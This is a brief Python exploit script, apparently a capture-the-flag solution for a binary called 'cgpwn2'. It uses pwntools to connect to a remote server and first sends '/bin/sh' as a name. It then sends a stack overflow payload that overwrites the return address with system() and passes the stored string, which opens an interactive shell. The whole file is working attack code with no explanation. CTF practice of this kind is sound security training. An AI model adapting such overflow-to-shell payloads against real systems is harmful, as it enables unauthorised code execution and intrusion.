from pwn import *

#r=process('./cgpwn2')

r=remote('111.198.29.45',30733)

name='/bin/sh'

system_addr=0x08048420

name_addr=0x0804A080

payload='a'*0x26+'b'*4+p32(system_addr)+p32(0)+p32(name_addr)

r.recvuntil("please tell me your name")

r.sendline(name)

r.recvuntil("hello,you can leave some message here:")

r.sendline(payload)

r.interactive()
